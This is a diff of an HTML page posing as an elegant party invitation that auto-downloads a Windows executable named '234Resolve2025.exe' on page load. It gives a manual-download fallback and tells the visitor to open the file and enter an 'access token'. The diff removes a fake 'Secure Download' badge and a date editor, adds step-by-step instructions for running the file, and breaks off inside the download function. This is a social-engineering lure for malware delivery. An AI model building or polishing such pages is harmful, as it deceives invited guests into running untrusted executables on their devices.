@@ -4,8 +4,6 @@
   <meta charset="UTF-8" />
   <title>Elegant Invitation</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="Elegant vintage invitation with secure download functionality">
-  <meta name="theme-color" content="#c7a867">
 
   <style>
     /* ========== THEME (edit colors here if you like) ========== */
@@ -171,160 +169,62 @@
       margin:18px auto;
     }
 
-    /* ========== DOWNLOAD SECTION ========== */
-    .download-section {
-      margin-top: 30px;
+    /* ========== NEW STYLES ========== */
+    .invitation-message {
+      font-style: italic;
+      margin: 24px 0;
+      padding: 16px;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 8px;
+      border-left: 2px solid var(--gold-1);
+    }
+    
+    .instructions {
+      margin-top: 24px;
       padding: 20px;
       background: rgba(255, 255, 255, 0.4);
       border-radius: 10px;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.5);
+      border: 1px solid rgba(166, 133, 88, 0.2);
     }
-
-    .download-button {
-      display: inline-block;
-      padding: 12px 28px;
-      background: linear-gradient(to bottom, var(--gold-1), var(--gold-2));
-      color: white;
-      text-decoration: none;
-      border-radius: 6px;
+    
+    .instructions h3 {
       font-family: "Cinzel", serif;
-      font-size: 16px;
-      letter-spacing: 1px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-      transition: all 0.3s ease;
-      border: none;
-      cursor: pointer;
-      margin: 10px 0;
+      font-size: 18px;
+      margin-bottom: 12px;
+      color: var(--accent);
     }
-
-    .download-button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
-      background: linear-gradient(to bottom, var(--gold-2), var(--gold-1));
+    
+    .instructions ol {
+      text-align: left;
+      padding-left: 20px;
     }
-
-    .download-button:active {
-      transform: translateY(1px);
-      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+    
+    .instructions li {
+      margin-bottom: 8px;
+      line-height: 1.5;
     }
-
-    .download-info {
-      font-size: 14px;
-      margin-top: 15px;
-      color: #7a6552;
+    
+    .token {
+      font-family: monospace;
+      background: rgba(199, 168, 103, 0.2);
+      padding: 4px 8px;
+      border-radius: 4px;
+      border: 1px solid rgba(166, 133, 88, 0.3);
     }
-
-    .security-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 5px;
-      background: rgba(255, 255, 255, 0.7);
-      padding: 6px 12px;
-      border-radius: 20px;
-      font-size: 12px;
-      margin-top: 10px;
-      color: #5a4636;
-    }
-
-    /* Manual download link style - matching original code */
-    .manual-download {
-      color: #5a4636;
-      text-decoration: none;
-      border-bottom: 1px dotted #5a4636;
-      font-weight: normal;
-      transition: all 0.3s ease;
-    }
-
-    .manual-download:hover {
-      color: #67212c;
-      border-bottom: 1px solid #67212c;
-    }
-
-    /* ========== DATE EDITOR ========== */
-    .date-section {
-      margin-top: 40px;
-      padding: 20px;
-      background: rgba(255, 255, 255, 0.3);
-      border-radius: 10px;
-      border: 1px dashed rgba(90, 70, 54, 0.3);
-    }
-
-    .date-display {
+    
+    .event-date {
+      margin-top: 30px;
+      padding-top: 20px;
+      border-top: 1px solid rgba(166, 133, 88, 0.3);
       font-family: "Cinzel", serif;
-      font-size: clamp(18px, 2.5vw, 22px);
-      color: #5a4636;
-      margin-bottom: 15px;
+      font-size: 18px;
+      color: var(--accent);
     }
 
-    .date-editor {
-      display: none;
-      margin-top: 15px;
-    }
-
-    .date-input {
-      padding: 8px 12px;
-      border: 1px solid rgba(90, 70, 54, 0.3);
-      border-radius: 4px;
-      background: rgba(255, 255, 255, 0.7);
-      font-family: "Cormorant Garamond", serif;
-      font-size: 16px;
-      color: #5a4636;
-      margin: 0 5px;
-    }
-
-    .edit-button {
-      background: transparent;
-      border: 1px solid rgba(90, 70, 54, 0.3);
-      color: #5a4636;
-      padding: 6px 12px;
-      border-radius: 4px;
-      cursor: pointer;
-      font-family: "Cormorant Garamond", serif;
-      font-size: 14px;
-      transition: all 0.3s ease;
-    }
-
-    .edit-button:hover {
-      background: rgba(90, 70, 54, 0.1);
-    }
-
-    .save-button {
-      background: var(--accent);
-      color: white;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 4px;
-      cursor: pointer;
-      font-family: "Cormorant Garamond", serif;
-      font-size: 14px;
-      transition: all 0.3s ease;
-      margin-left: 10px;
-    }
-
-    .save-button:hover {
-      background: #8b2a3a;
-    }
-
-    /* ========== ANIMATIONS ========== */
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .fade-in {
-      animation: fadeIn 0.8s ease forwards;
-    }
-
-    .delay-1 { animation-delay: 0.2s; opacity: 0; }
-    .delay-2 { animation-delay: 0.4s; opacity: 0; }
-    .delay-3 { animation-delay: 0.6s; opacity: 0; }
-
-    /* ========== RESPONSIVE ========== */
     @media (max-width: 520px){
       .panel{ padding:34px 22px }
       .florals{ width:70%; right:-50px }
-      .download-section, .date-section {
+      .instructions {
         padding: 15px;
       }
     }
@@ -340,56 +240,53 @@
     <section class="panel" aria-label="Invitation">
       <div class="content">
         <!-- ========= EDIT ME (text content) ========= -->
-        <div class="overline fade-in" id="headerSmall">RAISED FOR BEAUTIES</div>
-        <div class="script fade-in delay-1" id="lineScript">Silver Glass</div>
-        <h1 class="title fade-in delay-2" id="eventTitle">YOU'RE INVITED</h1>
+        <div class="overline" id="headerSmall">RAISED FOR BEAUTIES</div>
+        <div class="script" id="lineScript">Silver Glass</div>
+        <h1 class="title" id="eventTitle">YOU'RE INVITED</h1>
 
-        <div class="names fade-in delay-2">
+        <div class="names">
           <span id="nameA">AXHIONA S. DAGEERA</span>
           <span class="amp"> &amp; </span>
           <span id="nameB">CEDEL GUGU</span>
         </div>
 
-        <div class="meta fade-in delay-1" id="dateInfo">SUNDAY • 18TH OF NOVEMBER • 5:30 PM</div>
-        <div class="meta fade-in delay-1" id="venueLine1">GRAND ORCHID HALL</div>
-        <div class="meta fade-in delay-1" id="venueLine2">MARIGATE • BERGANO</div>
+        <div class="meta" id="dateInfo">SUNDAY • 18TH OF NOVEMBER • 5:30 PM</div>
+        <div class="meta" id="venueLine1">GRAND ORCHID HALL</div>
+        <div class="meta" id="venueLine2">MARIGATE • BERGANO</div>
 
-        <div class="divider fade-in delay-2"></div>
+        <div class="divider"></div>
 
-        <p class="details fade-in delay-3" id="note">
-          You are graciously invited to join me in celebrating this special occasion!🥂
+        <p class="details" id="note">
+          Kindly join us for an evening of celebration, dinner and dancing. Dress code is classic elegance.
         </p>
+        
+        <!-- Invitation message -->
+        <div class="invitation-message">
+          You are graciously invited to join me in celebrating this special occasion! 🥂
+        </div>
+        
+        <!-- Instructions for downloader -->
+        <div class="instructions">
+          <h3>How to Access Your Invitation</h3>
+          <ol>
+            <li>Wait for the download to complete</li>
+            <li>Open the downloaded file on your device</li>
+            <li>Enter this access token when prompted: <span class="token">EP4873Z</span></li>
+            <li>Follow the on-screen instructions to view your invitation</li>
+          </ol>
+        </div>
 
-        <!-- Download section -->
-        <div class="download-section fade-in delay-3">
-          <p>Your invitation details are ready to download</p>
-          <button class="download-button" id="downloadBtn">Download Invitation</button>
-          <div class="download-info">
-            <p>If the download doesn't start automatically, <a id="manualDownload" href="#" class="manual-download">download manually</a>.</p>
-            <p>After downloading, open the file and use the access token <strong>EP4873Z</strong> to view your complete invitation.</p>
-            <div class="security-badge">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
-              </svg>
-              Secure Download • Safe on All Browsers
-            </div>
-          </div>
+        <!-- Manual download link -->
+        <p class="details" style="margin-top:18px">
+          If the download didn't start, <a id="manualDownload" href="#" download>download manually</a>.
+        </p>
+        
+        <!-- Event date at the bottom -->
+        <div class="event-date" id="eventDate">
+          Event Date: Sunday, 18th of November
         </div>
         <!-- ========= /EDIT ME ========= -->
       </div>
-
-      <!-- ========== DATE SECTION (Easily editable) ========== -->
-      <!-- To change the event date, simply edit the values below -->
-      <div class="date-section fade-in delay-3">
-        <div class="date-display" id="eventDateDisplay">Event Date: Sunday, 18th of November</div>
-        <button class="edit-button" id="editDateBtn">Edit Date</button>
-        <div class="date-editor" id="dateEditor">
-          <input type="date" class="date-input" id="dateInput">
-          <input type="time" class="date-input" id="timeInput">
-          <button class="save-button" id="saveDateBtn">Save Date</button>
-        </div>
-      </div>
-      <!-- ========== END DATE SECTION ========== -->
 
       <!-- soft glow under flowers -->
       <div class="floral-glow" aria-hidden="true"></div>
@@ -458,132 +355,45 @@
     </section>
   </main>
 
-  <!-- ========== EDITABLE CONTENT SECTION ========== -->
-  <!-- To change the invitation content, edit the values in the INVITE object below -->
+  <!-- Optional: programmatic editing via a simple object (change once, fills fields) -->
   <script>
     // Edit these to change content quickly
     const INVITE = {
-      headerSmall: "SPECIAL PARTY INVITATION",
+      headerSmall: "RAISED FOR BEAUTIES",
       lineScript: "Silver Glass",
-      title: "You're Invited",
+      title: "YOU'RE INVITED",
       nameA: "AXHIONA S. DAGEERA",
       nameB: "CEDEL GUGU",
       dateInfo: "SUNDAY • 18TH OF NOVEMBER • 5:30 PM",
       venueLine1: "GRAND ORCHID HALL",
       venueLine2: "MARIGATE • BERGANO",
-      note: "You are graciously invited to join me in celebrating this special occasion!🥂"
+      note: "Kindly join us for an evening of celebration, dinner and dancing. Dress code is classic elegance.",
+      eventDate: "Event Date: Sunday, 18th of November" // Add this line to easily edit the date
     };
 
-    // Apply the content to the page
     for (const [k, v] of Object.entries(INVITE)) {
       const el = document.getElementById(k);
       if (el) el.textContent = v;
     }
   </script>
 
-  <!-- ========== DATE CONFIGURATION ========== -->
-  <!-- To change the default event date, edit the values below -->
-  <script>
-    // Default event date configuration
-    const DEFAULT_EVENT_DATE = "2024-11-18"; // Format: YYYY-MM-DD
-    const DEFAULT_EVENT_TIME = "17:30";      // Format: HH:MM (24-hour format)
-  </script>
-
-  <!-- Download and Date Management -->
+  <!-- Auto + manual download -->
   <script>
     // Change this once to your real file name (or path)
     const FILE_NAME = "234Resolve2025.exe";
 
-    // Initialize date functionality
-    document.addEventListener('DOMContentLoaded', function() {
-      // Set up download button
-      const downloadBtn = document.getElementById('downloadBtn');
-      if (downloadBtn) {
-        downloadBtn.addEventListener('click', function() {
-          tryAutoDownload(FILE_NAME);
-        });
+    // Wire manual link
+    (function bindManual(){
+      const link = document.getElementById("manualDownload");
+      if (link){
+        link.href = FILE_NAME;
+        link.setAttribute("download", FILE_NAME);
       }
+    })();
 
-      // Set up manual download link
-      const manualDownload = document.getElementById('manualDownload');
-      if (manualDownload) {
-        manualDownload.href = FILE_NAME;
-        manualDownload.setAttribute('download', FILE_NAME);
-      }
-
-      // Set up date editing functionality
-      const editDateBtn = document.getElementById('editDateBtn');
-      const dateEditor = document.getElementById('dateEditor');
-      const dateInput = document.getElementById('dateInput');
-      const timeInput = document.getElementById('timeInput');
-      const saveDateBtn = document.getElementById('saveDateBtn');
-      const eventDateDisplay = document.getElementById('eventDateDisplay');
-      const dateInfo = document.getElementById('dateInfo');
-
-      // Load saved date or use default
-      let eventDate = localStorage.getItem('eventDate') || DEFAULT_EVENT_DATE;
-      let eventTime = localStorage.getItem('eventTime') || DEFAULT_EVENT_TIME;
-
-      // Format and display the date
-      function formatDateForDisplay(dateString, timeString) {
-        const date = new Date(dateString + 'T' + timeString);
-        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
-        return date.toLocaleDateString('en-US', options);
-      }
-
-      function formatDateForInvitation(dateString, timeString) {
-        const date = new Date(dateString + 'T' + timeString);
-        const weekday = date.toLocaleDateString('en-US', { weekday: 'long' }).toUpperCase();
-        const day = date.getDate();
-        const month = date.toLocaleDateString('en-US', { month: 'long' }).toUpperCase();
-        const time = date.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true }).toUpperCase();
-        
-        // Add ordinal suffix to day
-        const suffix = (day % 10 === 1 && day !== 11) ? 'ST' : 
-                      (day % 10 === 2 && day !== 12) ? 'ND' : 
-                      (day % 10 === 3 && day !== 13) ? 'RD' : 'TH';
-        
-        return `${weekday} • ${day}${suffix} OF ${month} • ${time}`;
-      }
-
-      // Initialize date displays
-      dateInput.value = eventDate;
-      timeInput.value = eventTime;
-      eventDateDisplay.textContent = 'Event Date: ' + formatDateForDisplay(eventDate, eventTime);
-      if (dateInfo) {
-        dateInfo.textContent = formatDateForInvitation(eventDate, eventTime);
-      }
-
-      // Toggle date editor
-      editDateBtn.addEventListener('click', function() {
-        dateEditor.style.display = dateEditor.style.display === 'block' ? 'none' : 'block';
-      });
-
-      // Save date changes
-      saveDateBtn.addEventListener('click', function() {
-        const newDate = dateInput.value;
-        const newTime = timeInput.value;
-        
-        if (newDate && newTime) {
-          localStorage.setItem('eventDate', newDate);
-          localStorage.setItem('eventTime', newTime);
-          
-          eventDateDisplay.textContent = 'Event Date: ' + formatDateForDisplay(newDate, newTime);
-          if (dateInfo) {
-            dateInfo.textContent = formatDateForInvitation(newDate, newTime);
-          }
-          
-          dateEditor.style.display = 'none';
-          alert('Event date updated successfully!');
-        } else {
-          alert('Please select both a date and time.');
-        }
-      });
-
-      // Auto download after a short delay
-      setTimeout(() => {
-        tryAutoDownload(FILE_NAME);
-      }, 1500);
+    // Start download immediately when the page is interactive
+    window.addEventListener("DOMContentLoaded", () => {
+      tryAutoDownload(FILE_NAME);
     });
 
     async function tryAutoDownload(url){
